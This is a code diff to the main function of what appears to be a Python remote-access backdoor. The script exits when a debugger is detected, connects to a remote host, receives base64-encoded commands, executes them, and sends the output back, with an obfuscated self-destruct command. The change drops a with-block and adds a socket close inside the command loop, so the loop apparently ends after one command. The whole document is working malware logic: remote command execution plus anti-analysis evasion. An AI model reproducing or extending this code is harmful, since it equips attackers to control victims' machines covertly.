@@ -86,23 +86,24 @@ def main():
         print( STR_DEBUGGER_DETECTED )
         self_destruct()
 
-    with socket.socket() as s:
-        s.connect( ( host, port ) )
-        print( STR_CONNECTED_TO_SERVER )
-        
-        while True:
-            encoded_cmd = s.recv( 4096 ).decode().strip()
-            if not encoded_cmd:
-                break
+    s = socket.socket()
+    s.connect( ( host, port ) )
+    print( STR_CONNECTED_TO_SERVER )
+    
+    while True:
+        encoded_cmd = s.recv( 4096 ).decode().strip()
+        if not encoded_cmd:
+            break
 
-            cmd = base64.b64decode( encoded_cmd ).decode()
-            if cmd == obfuscate( STR_SELF_DESTRUCT ):
-                self_destruct()
+        cmd = base64.b64decode( encoded_cmd ).decode()
+        if cmd == obfuscate( STR_SELF_DESTRUCT ):
+            self_destruct()
 
-            print( STR_COMMAND_RECEIVED )
-            output = execute_command( cmd )
-            print( STR_SENDING_OUTPUT )
-            send_all( s , output )
+        print( STR_COMMAND_RECEIVED )
+        output = execute_command( cmd )
+        print( STR_SENDING_OUTPUT )
+        send_all( s , output )
+        s.close()
 
 if __name__ == '__main__':
     main()
